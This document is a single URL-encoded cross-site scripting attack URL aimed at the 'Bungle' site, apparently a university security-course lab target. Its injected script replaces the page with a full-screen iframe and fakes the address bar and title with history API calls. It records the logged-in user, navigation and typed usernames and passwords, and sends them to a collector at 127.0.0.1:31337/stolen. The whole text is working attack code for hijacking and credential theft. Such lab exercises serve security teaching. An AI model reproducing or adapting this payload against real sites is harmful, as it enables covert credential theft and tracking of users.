http://bungle-cs461.csl.illinois.edu/search?xssdefense=2&q=%3Cimg%20src%3D%27%23%27%20onerror%3D%27function%20payload(attacker)%20%7B%0A%09%09var%20first%3Dtrue%3B%0A%09%09function%20log(data)%20%7B%0A%09%09%09console.log(%24.param(data))%0A%09%09%09%24.get(attacker%2C%20data)%3B%0A%09%09%7D%0A%09%09function%20proxy(href)%20%7B%0A%09%09%09var%20target%20%3D%20%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2F%22%3B%0A%09%09%09%24(%22body%22).html(%22%22)%3B%0A%09%09%09var%20fake%20%3D%20%24(%22%3Ciframe%3E%22)%3B%0A%20%20%20%20%20%20%20%20%09%09fake.css(%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09position%3A%20%22absolute%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09height%3A%20%22100%25%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09width%3A%20%22100%25%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09border%3A%20%22none%22%0A%20%20%20%20%20%20%20%20%09%09%7D)%3B%0A%20%20%20%20%20%20%20%20%09%09fake.attr(%22id%22%2C%20%22fake_page%22)%3B%0A%20%20%20%20%20%20%20%20%09%09fake.attr(%22src%22%2C%20href)%3B%0A%20%20%20%20%20%20%20%20%09%09fake.appendTo(%22body%22)%3B%0A%09%09%09fake.load(function()%7B%0A%09%09%09%09if(first)%20%7B%0A%09%09%09%09%09%24(%22head%20title%22%2C%20window.parent.document).text(%22Bungle!%22)%3B%0A%09%09%09%09%09history.replaceState(null%2C%20null%2C%20target)%3B%0A%09%09%09%09%09first%3Dfalse%3B%0A%09%09%09%09%7D%0A%09%09%09%09log(%7Bevent%3A%20%22nav%22%2C%20user%3A%20%24(%22%23fake_page%22).contents().find(%22%23logged-in-user%22).text()%2C%20url%3A%20target%7D)%3B%0A%09%09%09%09%24(%22%23fake_page%22).contents().find(%22a%22).click(function()%7B%0A%09%09%09%09%09%24(%22head%20title%22%2C%20window.parent.document).text(%22Bungle!%22)%3B%0A%09%09%09%09%09history.replaceState(null%2C%20null%2C%20target)%3B%0A%09%09%09%09%09log(%7Bevent%3A%20%22nav%22%2C%20user%3A%20%24(%22%23fake_page%22).contents().find(%22%23logged-in-user%22).text()%2C%20url%3A%20target%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%09%24(%22%23fake_page%22).contents().find(%22%23log-in-btn%22).click(function(event)%7B%0A%09%09%09%09%09%24(%22head%20title%22%2C%20window.parent.document).text(%22Bungle!%22)%3B%0A%09%09%09%09%09history.pushState(null%2C%20null%2C%20target)%3B%0A%09%09%09%09%09var%20usern%3D%24(%22%23fake_page%22).contents().find(%22%23username%22).val()%3B%0A%09%09%09%09%09var%20passw%3D%24(%22%23fake_page%22).contents().find(%22%23userpass%22).val()%3B%0A%09%09%09%09%09log(%7Bevent%3A%20%22login%22%2C%20user%3A%20usern%2C%20pass%3A%20passw%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%09%24(%22%23fake_page%22).contents().find(%22%23new-account-btn%22).click(function(event)%7B%0A%09%09%09%09%09%24(%22head%20title%22%2C%20window.parent.document).text(%22Bungle!%22)%3B%0A%09%09%09%09%09history.pushState(null%2C%20null%2C%20target)%3B%0A%09%09%09%09%09var%20usern%3D%24(%22%23fake_page%22).contents().find(%22%23username%22).val()%3B%0A%09%09%09%09%09var%20passw%3D%24(%22%23fake_page%22).contents().find(%22%23userpass%22).val()%3B%0A%09%09%09%09%09log(%7Bevent%3A%20%22login%22%2C%20user%3A%20usern%2C%20pass%3A%20passw%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%09%24(%22%23fake_page%22).contents().find(%22%23log-out-btn%22).click(function(event)%7B%0A%09%09%09%09%09%24(%22head%20title%22%2C%20window.parent.document).text(%22Bungle!%22)%3B%0A%09%09%09%09%09history.pushState(null%2C%20null%2C%20target)%3B%0A%09%09%09%09%09log(%7Bevent%3A%20%22logout%22%2C%20user%3A%20%24(%22%23fake_page%22).contents().find(%22%23logged-in-user%22).text()%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%09%24(%22%23fake_page%22).contents().find(%22%23search-btn%22).click(function(event)%7B%0A%09%09%09%09%09%24(%22head%20title%22%2C%20window.parent.document).text(%22Search%20Results%22)%3B%0A%09%09%09%09%09var%20q%3D%24(%22%23fake_page%22).contents().find(%22%23query%22).val()%3B%0A%09%09%09%09%09var%20new_target%3D%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Fsearch%3Fq%3D%22%2Bq%0A%09%09%09%09%09history.pushState(null%2C%20null%2C%20new_target)%3B%0A%09%09%09%09%09log(%7Bevent%3A%20%22nav%22%2C%20user%3A%20%24(%22%23fake_page%22).contents().find(%22%23logged-in-user%22).text()%2C%20url%3Anew_target%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%09%24(%22%23fake_page%22).contents().find(%22%23search-again-btn%22).click(function(event)%7B%0A%09%09%09%09%09%24(%22head%20title%22%2C%20window.parent.document).text(%22Bungle!%22)%3B%0A%09%09%09%09%09history.pushState(null%2C%20null%2C%20target)%3B%0A%09%09%09%09%09log(%7Bevent%3A%20%22nav%22%2C%20user%3A%20%24(%22%23fake_page%22).contents().find(%22%23logged-in-user%22).text()%2C%20url%3Atarget%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D)%3B%0A%09%09%7D%0A%09%09proxy(%22.%2F%22)%3B%0A%09%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%27%3E
